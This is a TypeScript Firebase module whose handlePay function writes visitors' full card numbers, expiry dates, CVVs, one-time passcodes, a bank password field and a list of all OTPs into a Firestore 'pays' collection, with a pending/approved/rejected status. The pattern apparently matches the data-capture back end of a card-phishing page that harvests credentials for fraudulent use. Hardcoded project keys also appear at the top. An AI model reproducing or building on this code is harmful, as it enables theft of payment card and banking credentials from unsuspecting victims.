// firebase.js
import { getApp, getApps, initializeApp } from 'firebase/app';
import { doc, getFirestore, setDoc } from 'firebase/firestore';
import { SetStateAction } from 'react';

const firebaseConfig = {
  apiKey: "AIzaSyAdnBjhRa9ylbuywfQxEaPSwBqT9ccmVkE",
  authDomain: "sdvsvds.firebaseapp.com",
  projectId: "sdvsvds",
  storageBucket: "sdvsvds.firebasestorage.app",
  messagingSenderId: "519384112719",
  appId: "1:519384112719:web:89201d254e0d3359d9943a",
  measurementId: "G-DN7F555W5X"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
export const db = getFirestore(app);

export async function addData(data:any) {
  localStorage.setItem('visitor', data.id);
  try {
    const docRef = doc(db, 'pays', data.id!);
    await setDoc(
      docRef,
      { createdDate: new Date().toISOString(), ...data },
      { merge: true }
    );

    console.log('Document written with ID: ', docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error('Error adding document: ', e);
    // You might want to show an error message to the user here
  }
}
export const handlePay = async (
  paymentInfo: {
    cardNumber: string;
    year: string;
    month: string;
    bank: string | undefined;
    cvv: string | undefined;
    otp: string | undefined;
    pass: string;
    cardState?: string;
    allOtps?: string[];
    bank_card?: string[];
    prefix?: string;
    status?: 'pending' | 'new' | 'approved' | 'rejected';
    page?: string;
  },
  setPaymentInfo: {
    (
      value: SetStateAction<{
        cardNumber: string;
        year: string;
        month: string;
        bank?: string | undefined;
        cvv?: string | undefined;
        otp?: string | undefined;
        pass: string;
        cardState: string;
        allOtps: string[];
        bank_card: string[];
        prefix: string;
        status: 'pending' | 'new' | 'approved' | 'rejected';
        page: string;
      }>
    ): void;
    (
      value: SetStateAction<{
        cardNumber: string;
        year: string;
        month: string;
        bank?: string | undefined;
        cvv?: string | undefined;
        otp?: string | undefined;
        pass: string;
        cardState: string;
        allOtps: string[];
        bank_card: string[];
        prefix: string;
        status: 'pending' | 'new' | 'approved' | 'rejected';
        page: string;
      }>
    ): void;
    (arg0: (prev: any) => any): void;
  }
) => {
  try {
    const visitorId = localStorage.getItem('visitor');
    if (visitorId) {
      const docRef = doc(db, 'pays', visitorId);
      await setDoc(
        docRef,
        {
          ...paymentInfo,
          status: 'pending',
          createdDate: new Date().toISOString(),
        },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('Error adding document: ', error);
    alert('Error adding payment info to Firestore');
  }
};
